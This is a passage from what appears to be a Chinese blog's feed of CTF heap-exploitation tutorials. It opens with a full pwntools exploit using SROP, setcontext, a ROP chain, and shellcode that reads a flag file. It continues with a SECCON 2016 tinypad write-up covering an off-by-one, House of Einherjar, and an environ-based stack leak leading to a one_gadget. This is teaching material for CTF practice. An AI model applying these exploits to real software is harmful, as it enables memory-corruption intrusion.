class="number">10001</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.97OiO1SVl1/pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) == (size+<span class="number">1</span>):</span><br><span class="line">        sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'1'</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x78</span>, <span class="string">'2'</span>) <span class="comment">#1</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#3</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    new(<span class="number">0x78</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xa1</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x98</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0x8620</span><span class="number">-0x40</span><span class="number">-0x3</span>))</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> ) <span class="comment">#3</span></span><br><span class="line">    r(<span class="number">0x88</span>)</span><br><span class="line">    libc.address = uu64(r(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">    lg(<span class="string">"libc.addressess"</span>, libc.address)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">    new(<span class="number">0x88</span>, <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x13</span>))</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rdi = <span class="number">0</span></span><br><span class="line">    frame.rsi = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">    frame.rdx = <span class="number">0x2000</span></span><br><span class="line">    frame.rsp = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    frame.rip = libc.address + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">    payload = str(frame)</span><br><span class="line">    new(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x60</span>])</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">3</span> + p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">    edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    layout = [</span><br><span class="line">        libc.address + <span class="number">0x0000000000021102</span>, <span class="comment">#: pop rdi; ret; </span></span><br><span class="line">        libc.symbols[<span class="string">'__free_hook'</span>] &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">        libc.address + <span class="number">0x00000000000202e8</span>, <span class="comment">#: pop rsi; ret; </span></span><br><span class="line">        <span class="number">0x2000</span>,</span><br><span class="line">        libc.address + <span class="number">0x0000000000001b92</span>, <span class="comment">#: pop rdx; ret; </span></span><br><span class="line">        <span class="number">7</span>,</span><br><span class="line">        libc.address + <span class="number">0x0000000000033544</span>, <span class="comment">#: pop rax; ret; </span></span><br><span class="line">        <span class="number">10</span>,</span><br><span class="line">        libc.address + <span class="number">0x00000000000bc375</span>, <span class="comment">#: syscall; ret; </span></span><br><span class="line">        libc.address + <span class="number">0x0000000000002a71</span>, <span class="comment">#: jmp rsp; </span></span><br><span class="line">    ]</span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    <span class="comment">#shellcode = asm(shellcode, arch='amd64')</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    s(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#libc.address = uu64(r(8)) - libc.symbols['__IO_2_1_stdin_']</span></span><br><span class="line">    <span class="comment">#lg("libc.address", libc.address)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>堆部分我觉得入门已经学完了，至于house of 部分，等到用到的时候在学，因为堆结构和点看出来了，后面就看个人了，可以现学house of部分</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuZW9uZXcuY24vYXJjaGl2ZXMvMTI0Mw==" title="http://blog.eonew.cn/archives/1243">ex师傅的orw<i class="fa fa-external-link"></i></span></p><p>emm,萝卜师傅那篇文章找不到了，参考了他的那个数组负数改stdout部分</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/62c86bb4/">https://noone-hub.github.io/posts/62c86bb4/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程9</title>
    <url>/posts/14c79378/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程9"><a href="#pwn堆入门系列教程9" class="headerlink" title="pwn堆入门系列教程9"></a>pwn堆入门系列教程9</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQwNg==" title="https://xz.aliyun.com/t/6406">pwn堆入门系列教程6<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ0OQ==" title="https://xz.aliyun.com/t/6449">pwn堆入门系列教程7<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3Mw==" title="https://xz.aliyun.com/t/6473">pwn堆入门系列教程8<i class="fa fa-external-link"></i></span></p><p>学习House Of Einherjar</p><h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><p>这道题说难不难。。我也做得久了，因为exp看不懂啊，这么复杂。。。后来简化了下，感觉轻松点了</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>功能分析，新增，删除，编辑，退出</p><p>至于洞，off-by-one</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_until</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> __int64 len, <span class="keyword">unsigned</span> <span class="keyword">int</span> terminate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = terminate;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read_n(<span class="number">0L</span>L, &amp;a1[i], <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 || a1[i] == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[i] = <span class="number">0</span>; #a1[i]可以是a1[len],多了一个字节</span><br><span class="line">  <span class="keyword">if</span> ( i == len &amp;&amp; a1[len - <span class="number">1</span>] != <span class="string">'\n'</span> )</span><br><span class="line">    dummyinput(v4);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><h4 id="堆操作初始化部分"><a href="#堆操作初始化部分" class="headerlink" title="堆操作初始化部分"></a>堆操作初始化部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./tinypad'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"A"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">"D"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"E"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">"Q"</span>)</span><br></pre></td></tr></table></figure><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stage 1 leak the addr</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'2'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'3'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">heap = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">io.success(<span class="string">"heap: 0x%x"</span> % heap)</span><br><span class="line">io.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">leak_libc = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">io.success(<span class="string">"main_arena: 0x%x"</span> %leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3c4b20</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>这个部分简单啊，leak，全在unsortedbin里，这里学到一个知识点是rstrip,通常我只用过strip，<br>该rstrip()方法删除所有尾随字符（字符串末尾的字符），空格是要删除的默认尾随字符<br>至于88这个是main_arena+88，减掉就是main_arena</p><h4 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">tinypad = <span class="number">0x0000000000602040</span></span><br><span class="line">offset = heap + <span class="number">0x20</span> - (<span class="number">0x602040</span> + <span class="number">0x20</span>)</span><br><span class="line">io.success(<span class="string">"offset: 0x%x"</span> % offset)</span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(leak_libc + <span class="number">88</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>原解我感觉把题目搞复杂了，不需要for循环覆盖那个pre_size，完全可以利用add的时候加上就完了，<br>house of einherjar这个攻击方法有点类似于unlink，不过又不太相似</p><ol><li><p>目标:0x602060这个位置<br>heap + 0x20是第二个chunk位置<br>我们目的就是让第二个chunk的上一个chunk达到0x602060<br>所以pre_size就是第二个chunk位置减去0x602060<br>offset = heap + 0x20 - (0x602040 + 0x20)</p></li><li><p>fake_chunk这里是从tinypad开始地址开始覆盖的，前面0x20个作为后面填充部分，防止多次写的时候覆盖到<br>然后指针不像unlink那样了，<br>p-&gt;fd = p<br>p-&gt;bk = p</p></li><li><p>这里edit的时候都会从tinypad开始覆盖，所以编辑别个也可以的<br>edit(3, “4”*0x20 + fake_chunk)</p></li><li><p>remove(1)在add(0x18)，利用tcache的复用就行了，原exp的解是搞得很复杂，循环单字节null填充，太麻烦了感觉</p></li><li><p>这点不用这么复杂，0x101是为了后面分配用的，而p64(leak_libc+88)*2 这里，你只要bk是个可写的地址就行了，不要是不可写的就行，unsortedbin攻击里讲过</p></li></ol><p>引用ctf-wiki</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#在 glibc/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>edit(4, “4”<em>0x20 + p64(0) + p64(0x101) + p64(leak_libc + 88)</em>2)</p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stage 3</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line"></span><br><span class="line">io.success(<span class="string">"environ_pointer: 0x%x"</span> % environ_pointer)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'1'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">main_ret = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">io.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">quit()</span><br></pre></td></tr></table></figure><p>这里学到了一个新方法，通过environ泄露main函数ret地址，然后覆盖main_ret</p><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，可通过 environ 指针泄露栈地址。<br><span class="exturl" data-url="aHR0cDovLzB4NGM0My5jbi8yMDE4LzEwMTMvc3RhY2stb3ZlcmZsb3ctc21hc2gtdXRpbGl6YXRpb24v" title="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/">讲解这部分的文章<i class="fa fa-external-link"></i></span></p><p>这里还用到个常用攻击方法，覆盖两个指针，一个用来控制另一个地址的，这个跟unlink那会学的攻击手法一样的，至于0x8*30,可以用查看内存中对比</p><p>自己调试的时候可以main函数尾部下个断，可以看到我这个结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, 0x0000000000400e68 <span class="keyword">in</span> main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7f5fc76f6ae0 (_nl_C_LC_CTYPE_toupper) ◂— add    byte ptr [rax], 0</span><br><span class="line"> RDI  0x51</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x1</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff53d21f40 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x401370 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400e68 (main+1541) ◂— ret    </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x400e68       &lt;main+1541&gt;                ret             